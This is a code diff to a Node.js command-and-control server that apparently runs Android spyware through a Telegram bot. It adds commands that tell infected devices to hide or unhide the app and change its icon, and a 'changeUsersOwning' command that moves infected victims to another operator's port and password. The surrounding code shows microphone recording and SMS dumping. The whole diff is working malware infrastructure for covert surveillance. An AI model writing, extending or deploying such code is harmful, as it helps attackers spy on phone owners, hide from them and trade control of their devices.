@@ -633,14 +633,91 @@ const recordMicrophone = async (portname, passname, devid, shortcut, callback = 
     })
 }
 
+const hideApp = async (portname, passname, devid, shortcut, callback = () => {}) => {
+    await getUserByDeviceId(portname, passname, devid, async (user) => {
+        if (user.status == false){
+            callback({
+                status: false,
+                method: "hideApp",
+                message: "USER_NOT_FOUND",
+                device_id: devid
+            });
+            return;
+        }
+
+        user.user.socket.write(JSON.stringify({
+            port: portname,
+            password: passname,
+            method: "hideApp",
+            shortcut: shortcut
+        }));
+
+        callback({
+            status: true
+        });
+    })
+}
+
+const unhideApp = async (portname, passname, devid, shortcut, callback = () => {}) => {
+    await getUserByDeviceId(portname, passname, devid, async (user) => {
+        if (user.status == false){
+            callback({
+                status: false,
+                method: "unhideApp",
+                message: "USER_NOT_FOUND",
+                device_id: devid
+            });
+            return;
+        }
+
+        user.user.socket.write(JSON.stringify({
+            port: portname,
+            password: passname,
+            method: "hideApp",
+            shortcut: shortcut
+        }));
+
+        callback({
+            status: true
+        });
+    })
+}
+
+const changeIcon = async (portname, passname, devid, icon, shortcut, callback = () => {}) => {
+    await getUserByDeviceId(portname, passname, devid, async (user) => {
+        if (user.status == false){
+            callback({
+                status: false,
+                method: "changeIcon",
+                message: "USER_NOT_FOUND",
+                device_id: devid
+            });
+            return;
+        }
+
+        user.user.socket.write(JSON.stringify({
+            port: portname,
+            password: passname,
+            method: "changeIcon",
+            icon: icon,
+            shortcut: shortcut
+        }));
+
+        callback({
+            status: true
+        });
+    })
+}
+
 const changePortPassword = async (portname, passname, newpassword, callback = () => {}) => {
-    await getUsersByPort(portname, async (allusers) => {
+    await getUsersByPort(portname, passname, async (allusers) => {
         let nums = 0;
         for (let user of allusers.users){
             user.socket.write(JSON.parse({
                 port: portname,
                 password: passname,
-                new_password: newpassword
+                new_password: newpassword,
+                method: "changePortPassword"
             }))
             nums += 1;
         }
@@ -649,6 +726,41 @@ const changePortPassword = async (portname, passname, newpassword, callback = ()
             changed_users: nums,
             from: passname,
             to: newpassword
+        });
+    })
+}
+
+const changeUsersOwning = async (portname, passname, newport, newpassword, userslength, callback = () => {}) => {
+    await getUsersByPort(portname, passname, async (allusers) => {
+        if (userslength > allusers.users.length){
+            callback({
+                status: false,
+                message: "NOT_ENOUGH_USERS"
+            });
+            return;
+        }
+        let nums = 0;
+        for (let user of allusers.users){
+            user.socket.write(JSON.parse({
+                port: portname,
+                password: passname,
+                new_password: newpassword,
+                net_port: newport,
+                method: "changeUsersOwning"
+            }))
+            nums += 1;
+        }
+        callback({
+            status: true,
+            changed_users: nums,
+            from: {
+                port: portname,
+                password: passname
+            },
+            to: {
+                port: newport,
+                password: newpassword
+            }
         });
     })
 }
@@ -1072,8 +1184,68 @@ const server = net.createServer(async (socket) => {
                                 })
                             }
 
+                            if (message.method == "hideApp"){
+                                await hideApp(message.port, message.password, message.device_id, message.shortcut, async (dt) => {
+                                    if (dt.status == false && dt.message == "USER_NOT_FOUND"){
+                                        message.shortcut.edit == false ? await bot.sendMessage(
+                                            message.shortcut.chat_id,
+                                            build("🔴 𓏺|𓏺 user not found"),
+                                            {
+                                                reply_to_message_id: message.shortcut.message_id
+                                            }
+                                        ) : await bot.editMessageText(
+                                            build("🔴 𓏺|𓏺 user not found"),
+                                            {
+                                                chat_id: message.shortcut.chat_id,
+                                                message_id: message.shortcut.message_id
+                                            }
+                                        )
+                                    }
+                                })
+                            }
+
+                            if (message.method == "unhideApp"){
+                                await unhideApp(message.port, message.password, message.device_id, message.shortcut, async (dt) => {
+                                    if (dt.status == false && dt.message == "USER_NOT_FOUND"){
+                                        message.shortcut.edit == false ? await bot.sendMessage(
+                                            message.shortcut.chat_id,
+                                            build("🔴 𓏺|𓏺 user not found"),
+                                            {
+                                                reply_to_message_id: message.shortcut.message_id
+                                            }
+                                        ) : await bot.editMessageText(
+                                            build("🔴 𓏺|𓏺 user not found"),
+                                            {
+                                                chat_id: message.shortcut.chat_id,
+                                                message_id: message.shortcut.message_id
+                                            }
+                                        )
+                                    }
+                                })
+                            }
+
+                            if (message.method == "changeIcon"){
+                                await changeIcon(message.port, message.password, message.device_id, message.icon, message.shortcut, async (dt) => {
+                                    if (dt.status == false && dt.message == "USER_NOT_FOUND"){
+                                        message.shortcut.edit == false ? await bot.sendMessage(
+                                            message.shortcut.chat_id,
+                                            build("🔴 𓏺|𓏺 user not found"),
+                                            {
+                                                reply_to_message_id: message.shortcut.message_id
+                                            }
+                                        ) : await bot.editMessageText(
+                                            build("🔴 𓏺|𓏺 user not found"),
+                                            {
+                                                chat_id: message.shortcut.chat_id,
+                                                message_id: message.shortcut.message_id
+                                            }
+                                        )
+                                    }
+                                })
+                            }
+
                             if (message.method == "changePortPassword"){
-                                await changePortPassword(message.port, message.password, message.password, async (dt) => {
+                                await changePortPassword(message.port, message.password, message.new_password, async (dt) => {
                                     message.shortcut.edit == false ? await bot.sendMessage(
                                         message.shortcut.chat_id,
                                         build(`⚡ ${sym} new password seted for your users\n\n📪 ${sym} old pass: ${dt.from}\n🌉 ${sym} new pass: ${dt.to}`),
@@ -1087,6 +1259,41 @@ const server = net.createServer(async (socket) => {
                                             chat_id: message.shortcut.chat_id
                                         }
                                     )
+                                })
+                            }
+
+                            if (message.method == "changeUsersOwning"){
+                                await changeUsersOwning(message.port, message.password, message.new_port, message.new_password, message.userslength, async (dt) => {
+                                    if (dt.status){
+                                        let date = new Date();
+                                        message.shortcut.edit == false ? await bot.sendMessage(
+                                            message.shortcut.chat_id,
+                                            build(`➕ ${sym} ${message.userslength} users were moved\n\n💠 ${sym} from `) + `${message.port} & ${message.password}` + build(`\n\n🛠 ${sym} to `)+ `${message.new_port} & ${message.new_password}` + build(`\n\n⌚ ${sym} ${date.getUTCFullYear()}/${date.getUTCMonth()}/${date.getUTCDay()} - ${date.getUTCHours()}:${date.getUTCMinutes()}:${date.getUTCSeconds()}:${date.getUTCMilliseconds()}`),
+                                            {
+                                                reply_to_message_id: message.shortcut.message_id
+                                            }
+                                        ) : await bot.editMessageText(
+                                            build(`➕ ${sym} ${message.userslength} users were moved\n\n💠 ${sym} from `) + `${message.port} & ${message.password}` + build(`\n\n🛠 ${sym} to `)+ `${message.new_port} & ${message.new_password}` + build(`\n\n⌚ ${sym} ${date.getUTCFullYear()}/${date.getUTCMonth()}/${date.getUTCDay()} - ${date.getUTCHours()}:${date.getUTCMinutes()}:${date.getUTCSeconds()}:${date.getUTCMilliseconds()}`),
+                                            {
+                                                message_id: message.shortcut.message_id,
+                                                chat_id: message.shortcut.chat_id
+                                            }
+                                        )
+                                    } else {
+                                        message.shortcut.edit == false ? await bot.sendMessage(
+                                            message.shortcut.chat_id,
+                                            build(`🔴 ${sym} users of `) + `${message.port}` + build(` is not enough to change owning`),
+                                            {
+                                                reply_to_message_id: message.shortcut.message_id
+                                            }
+                                        ) : await bot.editMessageText(
+                                            build(`🔴 ${sym} users of `) + `${message.port}` + build(` is not enough to change owning`),
+                                            {
+                                                message_id: message.shortcut.message_id,
+                                                chat_id: message.shortcut.chat_id
+                                            }
+                                        )
+                                    }
                                 })
                             }
 
@@ -1786,6 +1993,102 @@ const server = net.createServer(async (socket) => {
                                     {
                                         reply_to_message_id: message.shortcut.message_id,
                                         caption: build(`📥 ${sym} all sms of `) + message.shortcut.device_id
+                                    }
+                                )
+                            } else {
+                                message.shortcut.edit ? await bot.editMessageText(
+                                    build(`🔴 ${sym} error detected\n - ${message.message}`),
+                                    {
+                                        parse_mode: "HTML",
+                                        chat_id: message.shortcut.chat_id,
+                                        message_id: message.shortcut.message_id
+                                    }
+                                ) : await bot.sendMessage(
+                                    message.shortcut.chat_id,
+                                    build(`🔴 ${sym} error detected\n - ${message.message}`),
+                                    {
+                                        reply_to_message_id: message.shortcut.message_id
+                                    }
+                                )
+                            }
+                        }  else if (message.method == "hideApp"){
+                            if (message.status == true){
+                                message.shortcut.edit ? await bot.editMessageText(
+                                    build(`🌚 ${sym} app has been hided successfully`),
+                                    {
+                                        parse_mode: "HTML",
+                                        chat_id: message.shortcut.chat_id,
+                                        message_id: message.shortcut.message_id
+                                    }
+                                ) : await bot.sendMessage(
+                                    message.shortcut.chat_id,
+                                    build(`🌚 ${sym} app has been hided successfully`),
+                                    {
+                                        reply_to_message_id: message.shortcut.message_id
+                                    }
+                                )
+                            } else {
+                                message.shortcut.edit ? await bot.editMessageText(
+                                    build(`🔴 ${sym} error detected\n - ${message.message}`),
+                                    {
+                                        parse_mode: "HTML",
+                                        chat_id: message.shortcut.chat_id,
+                                        message_id: message.shortcut.message_id
+                                    }
+                                ) : await bot.sendMessage(
+                                    message.shortcut.chat_id,
+                                    build(`🔴 ${sym} error detected\n - ${message.message}`),
+                                    {
+                                        reply_to_message_id: message.shortcut.message_id
+                                    }
+                                )
+                            }
+                        }  else if (message.method == "unhideApp"){
+                            if (message.status == true){
+                                message.shortcut.edit ? await bot.editMessageText(
+                                    build(`🌝 ${sym} app has been unhided successfully`),
+                                    {
+                                        parse_mode: "HTML",
+                                        chat_id: message.shortcut.chat_id,
+                                        message_id: message.shortcut.message_id
+                                    }
+                                ) : await bot.sendMessage(
+                                    message.shortcut.chat_id,
+                                    build(`🌝 ${sym} app has been unhided successfully`),
+                                    {
+                                        reply_to_message_id: message.shortcut.message_id
+                                    }
+                                )
+                            } else {
+                                message.shortcut.edit ? await bot.editMessageText(
+                                    build(`🔴 ${sym} error detected\n - ${message.message}`),
+                                    {
+                                        parse_mode: "HTML",
+                                        chat_id: message.shortcut.chat_id,
+                                        message_id: message.shortcut.message_id
+                                    }
+                                ) : await bot.sendMessage(
+                                    message.shortcut.chat_id,
+                                    build(`🔴 ${sym} error detected\n - ${message.message}`),
+                                    {
+                                        reply_to_message_id: message.shortcut.message_id
+                                    }
+                                )
+                            }
+                        }  else if (message.method == "changeIcon"){
+                            if (message.status == true){
+                                message.shortcut.edit ? await bot.editMessageText(
+                                    build(`🎭 ${sym} your app-icon changed into ${message.shortcut.icon} icon`),
+                                    {
+                                        parse_mode: "HTML",
+                                        chat_id: message.shortcut.chat_id,
+                                        message_id: message.shortcut.message_id
+                                    }
+                                ) : await bot.sendMessage(
+                                    message.shortcut.chat_id,
+                                    build(`🎭 ${sym} your app-icon changed into ${message.shortcut.icon} icon`),
+                                    {
+                                        reply_to_message_id: message.shortcut.message_id
                                     }
                                 )
                             } else {
